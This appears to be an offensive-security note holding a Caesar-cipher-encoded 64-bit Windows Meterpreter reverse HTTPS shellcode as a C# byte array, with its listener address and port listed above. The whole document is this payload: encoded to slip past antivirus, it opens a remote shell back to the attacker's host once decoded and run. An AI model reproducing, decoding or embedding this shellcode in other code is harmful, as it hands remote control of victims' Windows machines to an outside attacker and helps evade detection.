## Ceaser cypher encrypted 64 bit shellcode
lhost - 192.168.49.135
lport - 443
type - windows/x64/meterpreter/reverse_https
```C#
byte[] buf = new byte[721] {
0xfe, 0x4a, 0x85, 0xe6, 0xf2, 0xea, 0xce, 0x02, 0x02, 0x02, 0x43, 0x53, 0x43, 0x52, 0x54, 0x53, 0x58, 0x4a, 0x33, 0xd4, 0x67, 0x4a, 0x8d, 0x54, 0x62, 0x4a, 0x8d, 0x54, 0x1a, 0x4a, 0x8d, 0x54, 0x22, 0x4a, 0x11, 0xb9, 0x4c, 0x4c, 0x4a, 0x8d, 0x74, 0x52, 0x4f, 0x33, 0xcb, 0x4a, 0x33, 0xc2, 0xae, 0x3e, 0x63, 0x7e, 0x04, 0x2e, 0x22, 0x43, 0xc3, 0xcb, 0x0f, 0x43, 0x03, 0xc3, 0xe4, 0xef, 0x54, 0x4a, 0x8d, 0x54, 0x22, 0x8d, 0x44, 0x3e, 0x43, 0x53, 0x4a, 0x03, 0xd2, 0x68, 0x83, 0x7a, 0x1a, 0x0d, 0x04, 0x11, 0x87, 0x74, 0x02, 0x02, 0x02, 0x8d, 0x82, 0x8a, 0x02, 0x02, 0x02, 0x4a, 0x87, 0xc2, 0x76, 0x69, 0x4a, 0x03, 0xd2, 0x46, 0x8d, 0x42, 0x22, 0x4b, 0x03, 0xd2, 0x52, 0x8d, 0x4a, 0x1a, 0xe5, 0x58, 0x4a, 0x01, 0xcb, 0x4f, 0x33, 0xcb, 0x43, 0x8d, 0x36, 0x8a, 0x4a, 0x03, 0xd8, 0x4a, 0x33, 0xc2, 0x43, 0xc3, 0xcb, 0x0f, 0xae, 0x43, 0x03, 0xc3, 0x3a, 0xe2, 0x77, 0xf3, 0x4e, 0x05, 0x4e, 0x26, 0x0a, 0x47, 0x3b, 0xd3, 0x77, 0xda, 0x5a, 0x46, 0x8d, 0x42, 0x26, 0x4b, 0x03, 0xd2, 0x68, 0x43, 0x8d, 0x0e, 0x4a, 0x46, 0x8d, 0x42, 0x1e, 0x4b, 0x03, 0xd2, 0x43, 0x8d, 0x06, 0x8a, 0x4a, 0x03, 0xd2, 0x43, 0x5a, 0x43, 0x5a, 0x60, 0x5b, 0x5c, 0x43, 0x5a, 0x43, 0x5b, 0x43, 0x5c, 0x4a, 0x85, 0xee, 0x22, 0x43, 0x54, 0x01, 0xe2, 0x5a, 0x43, 0x5b, 0x5c, 0x4a, 0x8d, 0x14, 0xeb, 0x4d, 0x01, 0x01, 0x01, 0x5f, 0x4a, 0x33, 0xdd, 0x55, 0x4b, 0xc0, 0x79, 0x6b, 0x70, 0x6b, 0x70, 0x67, 0x76, 0x02, 0x43, 0x58, 0x4a, 0x8b, 0xe3, 0x4b, 0xc9, 0xc4, 0x4e, 0x79, 0x28, 0x09, 0x01, 0xd7, 0x55, 0x55, 0x4a, 0x8b, 0xe3, 0x55, 0x5c, 0x4f, 0x33, 0xc2, 0x4f, 0x33, 0xcb, 0x55, 0x55, 0x4b, 0xbc, 0x3c, 0x58, 0x7b, 0xa9, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0xea, 0x11, 0x02, 0x02, 0x02, 0x33, 0x3b, 0x34, 0x30, 0x33, 0x38, 0x3a, 0x30, 0x36, 0x3b, 0x30, 0x33, 0x35, 0x37, 0x02, 0x5c, 0x4a, 0x8b, 0xc3, 0x4b, 0xc9, 0xc2, 0xbd, 0x03, 0x02, 0x02, 0x4f, 0x33, 0xcb, 0x55, 0x55, 0x6c, 0x05, 0x55, 0x4b, 0xbc, 0x59, 0x8b, 0xa1, 0xc8, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0xea, 0xa9, 0x02, 0x02, 0x02, 0x31, 0x37, 0x48, 0x73, 0x5a, 0x46, 0x58, 0x37, 0x6b, 0x71, 0x51, 0x44, 0x64, 0x3b, 0x33, 0x74, 0x33, 0x51, 0x67, 0x5a, 0x7c, 0x75, 0x79, 0x55, 0x5c, 0x4a, 0x46, 0x7c, 0x4d, 0x58, 0x70, 0x32, 0x52, 0x65, 0x57, 0x53, 0x70, 0x44, 0x37, 0x55, 0x5c, 0x6c, 0x72, 0x5a, 0x36, 0x49, 0x51, 0x6b, 0x77, 0x47, 0x6d, 0x58, 0x63, 0x47, 0x3a, 0x7c, 0x2f, 0x43, 0x4f, 0x43, 0x57, 0x49, 0x6b, 0x43, 0x4f, 0x49, 0x74, 0x4d, 0x47, 0x59, 0x39, 0x6c, 0x55, 0x49, 0x78, 0x6e, 0x2f, 0x79, 0x78, 0x68, 0x53, 0x4a, 0x37, 0x33, 0x56, 0x2f, 0x78, 0x76, 0x52, 0x44, 0x52, 0x66, 0x61, 0x36, 0x35, 0x38, 0x6d, 0x64, 0x75, 0x4d, 0x3a, 0x37, 0x4e, 0x6e, 0x6a, 0x57, 0x50, 0x36, 0x7c, 0x77, 0x73, 0x4f, 0x6a, 0x61, 0x34, 0x79, 0x33, 0x6a, 0x47, 0x75, 0x54, 0x47, 0x6b, 0x65, 0x4b, 0x4e, 0x4d, 0x6c, 0x79, 0x33, 0x58, 0x3a, 0x7a, 0x59, 0x7b, 0x4e, 0x59, 0x6d, 0x5a, 0x50, 0x48, 0x7b, 0x32, 0x2f, 0x55, 0x72, 0x47, 0x4a, 0x71, 0x32, 0x56, 0x44, 0x4d, 0x64, 0x56, 0x44, 0x45, 0x5b, 0x72, 0x5b, 0x77, 0x53, 0x33, 0x5b, 0x37, 0x6c, 0x02, 0x4a, 0x8b, 0xc3, 0x55, 0x5c, 0x43, 0x5a, 0x4f, 0x33, 0xcb, 0x55, 0x4a, 0xba, 0x02, 0x34, 0xaa, 0x86, 0x02, 0x02, 0x02, 0x02, 0x52, 0x55, 0x55, 0x4b, 0xc9, 0xc4, 0xed, 0x57, 0x30, 0x3d, 0x01, 0xd7, 0x4a, 0x8b, 0xc8, 0x6c, 0x0c, 0x61, 0x4a, 0x8b, 0xf3, 0x6c, 0x21, 0x5c, 0x54, 0x6a, 0x82, 0x35, 0x02, 0x02, 0x4b, 0x8b, 0xe2, 0x6c, 0x06, 0x43, 0x5b, 0x4b, 0xbc, 0x77, 0x48, 0xa0, 0x88, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0x4f, 0x33, 0xc2, 0x55, 0x5c, 0x4a, 0x8b, 0xf3, 0x4f, 0x33, 0xcb, 0x4f, 0x33, 0xcb, 0x55, 0x55, 0x4b, 0xc9, 0xc4, 0x2f, 0x08, 0x1a, 0x7d, 0x01, 0xd7, 0x87, 0xc2, 0x77, 0x21, 0x4a, 0xc9, 0xc3, 0x8a, 0x15, 0x02, 0x02, 0x4b, 0xbc, 0x46, 0xf2, 0x37, 0xe2, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0x4a, 0x01, 0xd1, 0x76, 0x04, 0xed, 0xac, 0xea, 0x57, 0x02, 0x02, 0x02, 0x55, 0x5b, 0x6c, 0x42, 0x5c, 0x4b, 0x8b, 0xd3, 0xc3, 0xe4, 0x12, 0x4b, 0xc9, 0xc2, 0x02, 0x12, 0x02, 0x02, 0x4b, 0xbc, 0x5a, 0xa6, 0x55, 0xe7, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0x4a, 0x95, 0x55, 0x55, 0x4a, 0x8b, 0xe9, 0x4a, 0x8b, 0xf3, 0x4a, 0x8b, 0xdc, 0x4b, 0xc9, 0xc2, 0x02, 0x22, 0x02, 0x02, 0x4b, 0x8b, 0xfb, 0x4b, 0xbc, 0x14, 0x98, 0x8b, 0xe4, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0x4a, 0x85, 0xc6, 0x22, 0x87, 0xc2, 0x76, 0xb4, 0x68, 0x8d, 0x09, 0x4a, 0x03, 0xc5, 0x87, 0xc2, 0x77, 0xd4, 0x5a, 0xc5, 0x5a, 0x6c, 0x02, 0x5b, 0x4b, 0xc9, 0xc4, 0xf2, 0xb7, 0xa4, 0x58, 0x01, 0xd7 };

```